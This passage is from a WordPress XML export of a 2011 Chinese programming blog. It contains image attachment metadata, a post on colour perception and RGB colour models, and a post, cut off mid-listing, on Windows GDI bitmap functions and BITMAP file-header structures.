		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[13]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>lookfodiamond</title>
		<link>http://codemylife.blogcn.com/2011/05/%e8%87%aa%e5%8a%a8%e7%8e%a9%e3%80%8a%e8%92%99%e7%89%b9%e7%a5%96%e7%8e%9b%e7%9a%84%e5%ae%9d%e8%97%8f%e3%80%8b%e7%9a%84%e4%b8%9c%e4%b8%9c/lookfodiamond/</link>
		<pubDate>Sat, 07 May 2011 08:07:37 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp04/M00/00/54/wKgKDE3E_ckAAAAAAAFqfBLkSps232.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>34</wp:post_id>
		<wp:post_date>2011-05-07 16:07:37</wp:post_date>
		<wp:post_date_gmt>2011-05-07 08:07:37</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>lookfodiamond</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>32</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp04/M00/00/54/wKgKDE3E_ckAAAAAAAFqfBLkSps232.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"664";s:6:"height";s:3:"433";s:14:"hwstring_small";s:23:"height='83' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/00/54/wKgKDU3E_ckAAAAAAAAQBCVM6L8641.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"122";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/00/79/wKgKCk3E_ckAAAAAAAArKx9EMm4323.jpg";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"322";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/00/30/wKgKDU3E_ckAAAAAAADm8HY7x_Q230.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/00/79/wKgKCk3E_ckAAAAAAAFqfERzyNg598.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>color1</title>
		<link>http://codemylife.blogcn.com/2011/05/%e8%89%b2%e5%bd%a9/color1/</link>
		<pubDate>Sun, 08 May 2011 07:40:51 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp03/M00/00/80/wKgKCk3GSQMAAAAAAANlQ3LLiIU725.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>36</wp:post_id>
		<wp:post_date>2011-05-08 15:40:51</wp:post_date>
		<wp:post_date_gmt>2011-05-08 07:40:51</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>color1</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>39</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp03/M00/00/80/wKgKCk3GSQMAAAAAAANlQ3LLiIU725.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"543";s:6:"height";s:3:"958";s:14:"hwstring_small";s:22:"height='96' width='54'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/00/58/wKgKDU3GSQMAAAAAAAARDTIvkvk762.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"106";s:6:"height";s:3:"188";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/00/58/wKgKDU3GSQMAAAAAAAApw2i36P0104.jpg";}s:5:"large";a:3:{s:5:"width";s:3:"280";s:6:"height";s:3:"494";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/00/58/wKgKDE3GSQMAAAAAAADu8DSvhF0641.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/00/80/wKgKCk3GSQMAAAAAAANlQ2fOmSc476.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>color2</title>
		<link>http://codemylife.blogcn.com/2011/05/%e8%89%b2%e5%bd%a9/color2/</link>
		<pubDate>Sun, 08 May 2011 07:43:35 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp05/M00/00/58/wKgKDE3GSacAAAAAAANoTh5vuyg487.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>37</wp:post_id>
		<wp:post_date>2011-05-08 15:43:35</wp:post_date>
		<wp:post_date_gmt>2011-05-08 07:43:35</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>color2</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>39</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp05/M00/00/58/wKgKDE3GSacAAAAAAANoTh5vuyg487.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"543";s:6:"height";s:3:"996";s:14:"hwstring_small";s:22:"height='96' width='52'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/00/80/wKgKDE3GSacAAAAAAAAQgjsbHhQ447.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"102";s:6:"height";s:3:"188";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/00/58/wKgKDE3GSacAAAAAAAAk5UqgKtw666.jpg";}s:5:"large";a:3:{s:5:"width";s:3:"269";s:6:"height";s:3:"494";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/00/31/wKgKC03GSacAAAAAAADhfUfQkFE067.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/00/58/wKgKDE3GSacAAAAAAANoTiHhwNM496.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>color3</title>
		<link>http://codemylife.blogcn.com/2011/05/%e8%89%b2%e5%bd%a9/color3/</link>
		<pubDate>Sun, 08 May 2011 07:48:02 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/00/80/wKgKDE3GSrIAAAAAAAHkOQl2bf0828.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>38</wp:post_id>
		<wp:post_date>2011-05-08 15:48:02</wp:post_date>
		<wp:post_date_gmt>2011-05-08 07:48:02</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>color3</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>39</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/00/80/wKgKDE3GSrIAAAAAAAHkOQl2bf0828.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"543";s:6:"height";s:3:"600";s:14:"hwstring_small";s:22:"height='96' width='86'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/00/31/wKgKC03GSrMAAAAAAAAQUSXM-8U995.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"170";s:6:"height";s:3:"188";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/00/58/wKgKDU3GSrMAAAAAAAA4tA9COOI697.jpg";}s:5:"large";a:3:{s:5:"width";s:3:"447";s:6:"height";s:3:"494";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/00/31/wKgKC03GSrMAAAAAAAFD83aZQiA304.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/00/80/wKgKCk3GSrMAAAAAAAHkOTJ7tfw513.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>light</title>
		<link>http://codemylife.blogcn.com/2011/05/%e8%89%b2%e5%bd%a9/light/</link>
		<pubDate>Sun, 08 May 2011 08:48:30 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp03/M00/00/81/wKgKCk3GWN4AAAAAAADDhlmIzAA156.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>40</wp:post_id>
		<wp:post_date>2011-05-08 16:48:30</wp:post_date>
		<wp:post_date_gmt>2011-05-08 08:48:30</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>light</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>39</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp03/M00/00/81/wKgKCk3GWN4AAAAAAADDhlmIzAA156.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"453";s:6:"height";s:3:"285";s:14:"hwstring_small";s:23:"height='80' width='128'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/00/59/wKgKDU3GWN4AAAAAAAARtja1C5E812.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"118";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/00/81/wKgKCk3GWN4AAAAAAAAoNyN8caM717.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/00/7F/wKgKCk3GWN4AAAAAAADDhh8cCw8864.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>rgb</title>
		<link>http://codemylife.blogcn.com/2011/05/%e8%89%b2%e5%bd%a9/rgb/</link>
		<pubDate>Sun, 08 May 2011 12:03:36 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp02/M00/00/32/wKgKC03GhpgAAAAAAAAY0lUfeJk528.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>41</wp:post_id>
		<wp:post_date>2011-05-08 20:03:36</wp:post_date>
		<wp:post_date_gmt>2011-05-08 12:03:36</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>rgb</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>39</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp02/M00/00/32/wKgKC03GhpgAAAAAAAAY0lUfeJk528.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"200";s:6:"height";s:3:"200";s:14:"hwstring_small";s:22:"height='96' width='96'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/00/33/wKgKC03GhpgAAAAAAAAR1AmPi9A479.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"188";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/00/59/wKgKDU3GhpgAAAAAAABCKmriStQ309.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/00/82/wKgKCk3GhpgAAAAAAAAY0hjhlzw686.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>300px-Colorspace</title>
		<link>http://codemylife.blogcn.com/2011/05/%e8%89%b2%e5%bd%a9/300px-colorspace/</link>
		<pubDate>Sun, 08 May 2011 12:25:15 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp01/M00/00/32/wKgKC03Gi6sAAAAAAAE29BQ01CU960.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>42</wp:post_id>
		<wp:post_date>2011-05-08 20:25:15</wp:post_date>
		<wp:post_date_gmt>2011-05-08 12:25:15</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>300px-colorspace</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>39</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp01/M00/00/32/wKgKC03Gi6sAAAAAAAE29BQ01CU960.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"300";s:6:"height";s:3:"308";s:14:"hwstring_small";s:22:"height='96' width='93'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/00/32/wKgKC03Gi6wAAAAAAAAqhUYY6_I279.png";}s:6:"medium";a:3:{s:5:"width";s:3:"183";s:6:"height";s:3:"188";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/00/59/wKgKDE3Gi6wAAAAAAACfkDfcvog950.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/00/82/wKgKCk3Gi6wAAAAAAAE29AsQMug477.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>色彩</title>
		<link>http://codemylife.blogcn.com/2011/05/%e8%89%b2%e5%bd%a9/</link>
		<pubDate>Sun, 08 May 2011 13:24:35 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[杂记]]></category>

		<category domain="category" nicename="%e6%9d%82%e8%ae%b0"><![CDATA[杂记]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=39</guid>
		<description></description>
		<content:encoded><![CDATA[对于客户端而言，处理的事情本质上是响应用户请求，然后将计算结果用一种合适的方式表现出来。做游戏开发更是如此，用户看到了最终效果是经过计算，最后显示在屏幕上的像素点序列，例如各种色彩斑斓的魔法，所以我觉得应该加深自己对色彩的认识，故记录一下，以下内容大部分是从网上整理来的。<img class="alignright" style="float: right;" src="http://files.blogcn.com/wp03/M00/00/81/wKgKCk3GWN4AAAAAAADDhlmIzAA156.jpg" alt="" width="453" height="285" />

<strong>光的物理现象</strong>：人可以感受的波长范围内（约312.30纳米至745.40纳米），它被称为可见光，有时也被简称为光。假如我们将一个光源各个波长的强度列在一起，我们就可以获得这个光源的光谱。一个物体的光谱决定这个物体的光学特性，包括它的颜色。一个弥散地反射所有波长的光的表面是白色的，而一个吸收所有波长的光的表面是黑色的。

<strong>颜色的感受</strong>：人是由视网膜上的锥状细胞和棒状细胞来感受颜色的。人眼中有三种不同的锥状细胞：第一种主要感受<strong>红色</strong>，它的最敏感点在565纳米左右；第二种主要感受<strong>绿色</strong>，它的最敏感点在535纳米左右；第三种主要感受<strong>蓝色</strong>，其最敏感点在420纳米左右。杆状细胞只有一种，它的最敏感的颜色波长在蓝色和绿色之间。

每种锥状细胞的敏感曲线大致是钟形的，锥状细胞依照感应波长不同由长到短分为L、M、S三种。因此进入眼睛的光一般相应这三种锥状细胞和杆状细胞被分为4个不同强度的信号。

因为每种细胞也对其他的波长有反映，因此并非所有的光谱都能被区分。比如绿光不仅可以被绿锥状细胞接受，其他锥状细胞也可以产生一定强度的信号，所有这些信号的组合就是人眼能够区分的颜色的总和。

如我们的眼睛长时间看一种颜色的话，我们把目光转开就会在别的地方看到这种颜色的补色。这被称作颜色的互补原理，简单说来，当某个细胞受到某种颜色的光刺激时，它同时会释放出两种信号：刺激黄色，并同时拟制黄色的补色蓝色。
<div><img class="alignright" style="float: right;" src="http://files.blogcn.com/wp02/M00/00/32/wKgKC03GhpgAAAAAAAAY0lUfeJk528.png" alt="" width="200" height="200" /></div>
<strong>三原色</strong>：对颜色的感受造就了三原色。三原色光模式（RGB color model，又译RGB颜色模型或红绿蓝颜色模型）是一种加色模型，是用三种原色──红色、绿色和蓝色的色光以不同的比例相加，以产生多种多样的色光。三原色光显示主要用于电视和计算机的显示器

<strong>色彩模型：</strong>色彩模型是描述使用一组值（通常使用三个、四个值或者颜色成分）表示颜色方法的抽象数学模型。例如 三原色光模式(RGB) 和印刷四分色模式(CMYK) 都是色彩模型。但是一个与绝对色彩空间没有函数映射关系的色彩模型或多或少地都是与特定应用要求几乎没有关系的任意色彩系统。

<img class="alignleft" style="float: left;" src="http://files.blogcn.com/wp01/M00/00/32/wKgKC03Gi6sAAAAAAAE29BQ01CU960.png" alt="" width="300" height="308" />在色彩模型和一个特定的参照色彩空间之间加入一个特定的映射函数就在参照色彩空间中出现了一个明确的"footprint"。这个 "footprint" 称为色域，并且与色彩模型一起定义为一个新的色彩空间。例如 Adobe RGB 和 sRGB 是两个基于 RGB 模型的不同绝对色彩空间。

计算机用RGB模型来对颜色进行编码的：
<ul>
	<li>8位模式。2<sup>8</sup>=256，故又称为256颜色模式，256颜色模式每个像素都是调色板中的一个索引。</li>
	<li>16位模式。又称高彩色模式，每个像素16位（565或555）。</li>
	<li>24、32位模式。又称真彩模式，每个像素24或32位，许多视频卡不支持24位模式，只支持32位模式（A8R8G8B8或X8R8G8B8，后一种指最高8位只启对齐作用）。</li>
</ul>
Windows GDI 函数调用中使用COLORREF值表示色彩，31-24(0),23-16(蓝),16-8(绿) ,7-0(红)。颜色宏如下：
#define RGB(r,g,b) ((COLORREF)(((BYTE)(r) | ((WORD)((BYTE)(g) &lt;&lt;8) | (((DWORD)(BYTE)(b) &lt;&lt; 16)))

<strong>RGB颜色值图</strong>

<strong><img class="alignleft" style="float: left;" src="http://files.blogcn.com/wp03/M00/00/80/wKgKCk3GSQMAAAAAAANlQ3LLiIU725.jpg" alt="" width="543" height="958" /></strong>

<img class="alignleft" style="float: left;" src="http://files.blogcn.com/wp05/M00/00/58/wKgKDE3GSacAAAAAAANoTh5vuyg487.jpg" alt="" width="543" height="996" />

<img class="alignleft" style="float: left;" src="http://files.blogcn.com/wp06/M00/00/80/wKgKDE3GSrIAAAAAAAHkOQl2bf0828.jpg" alt="" width="543" height="600" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>39</wp:post_id>
		<wp:post_date>2011-05-08 21:24:35</wp:post_date>
		<wp:post_date_gmt>2011-05-08 13:24:35</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e8%89%b2%e5%bd%a9</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1304861156]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[14]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>位图结构</title>
		<link>http://codemylife.blogcn.com/2011/05/%e4%bd%8d%e5%9b%be%e7%bb%93%e6%9e%84/</link>
		<pubDate>Mon, 16 May 2011 07:19:53 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[Windows]]></category>

		<category domain="category" nicename="windows"><![CDATA[Windows]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=43</guid>
		<description></description>
		<content:encoded><![CDATA[《windows程序设计》真是博大精深啊，学习win32 api 不得不看它啊！有木有有木有……
微软的api有的参数设计的相当复杂啊，相当多啊，你光看msdn上对参数的介绍就得看半天啊，有木有有木有……
还没建立自己的代码库，于是只有硬着头皮啃书啊，有木有有木有……
:) 言归正传，这两天看了下DIB位图的显示，为了方便，封装了下Windows对文件的操作。

首先简要介绍一下DDB（设备相关位图）。几个用于传输像素的函数：
位块传输：BOOL BitBlt(HDC hdcDest, int nXDest, int nYDest, int nWidth, int nHight, HDC hdcSrc, int nXsrc, int nYsrc, DWORD dwRop);
位块拉伸：BOOL StretchBlt(HDC hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, HDC hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, DWORD dwRop);
设置拉伸模式：int SetStretchBlitMode(hdc, iMode);
图案PatBlt：BOOL PatBlt(HDC hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, DWORD dwRop);

创建DDB：DDB是Windows图形设备接口的图形对象之一（其中还包括画笔、画刷、字体、元文件及调色板）。这些图形对象保存在GDI模式内部，由应用程序的数字句柄引用。
函数：HBITMAP CreateBitmap(int nWidth, int nHeight, UINT cPlanes, UINT cBitsPerPel, CONST VOID *lpvBits);
Windows为位图分配内存时，每行像素都具有偶数个字节。实际上，你将用两种类型的参数调用CreateBitmap:
<ul>
	<li>cPanles 和 cBitsPerPel都等于1（表示单色位图）；</li>
	<li>cPanles 和 cBitsPerPel都等于某个特定设备描述表的值，可以使用PLANS和BITSPIXEL索引从GetDeviceCaps函数获得。</li>
</ul>
更方便的情况，使用HBITMAP CreateCompatibleBitmap(HDC hdc, int nWidth, int nHeight);创建一个和设备兼容的位图。
第三个创建位图函数：HBITMAP CreateBitmapIndirect(CONST BITMAP *lpbm);
BITMAP结构：
<pre class="c">typedef struct tagBITMAP {  /* bm */
    int bmType;
    int bmWidth;
    int bmHeight;
    int bmWidthBytes;
    BYTE bmPlanes;
    BYTE bmBitsPixel;
    LPVOID bmBits;
} BITMAP;</pre>
除了创建位图函数，获得GDI位图句柄的另一种方法是加载位图资源：
HBITMAP LoadBitmap(HINSTANCE hInstance,LPCTSTR lpBitmapName);

设备无关位图（DIB）
文件格式：首先看OS/2中出现的位图格式，包括4部分：文件头，信息头，色彩表，位图像素位。紧跟在色彩表（24位DIB中是信息头）后面是像素位本身。
<pre class="c">//文件头
typedef struct tagBITMAPFILEHEADER {
    WORD    bfType;       //'BM' or 0x4D42
    DWORD   bfSize;
    WORD    bfReserved1;
    WORD    bfReserved2;
    DWORD   bfOffBits;   //DIB像素位偏移
} BITMAPFILEHEADER;
//信息头 和 色彩表
typedef struct tagBITMAPCOREINFO {
    BITMAPCOREHEADER bmciHeader;
    RGBTRIPLE bmciColors[1];
} BITMAPCORE;
</br>
typedef struct tagBITMAPCOREHEADER {
    DWORD bcSize;   // 本结构大小的字节数 12
    WORD bcWidth;   // 位图宽度,象素单位
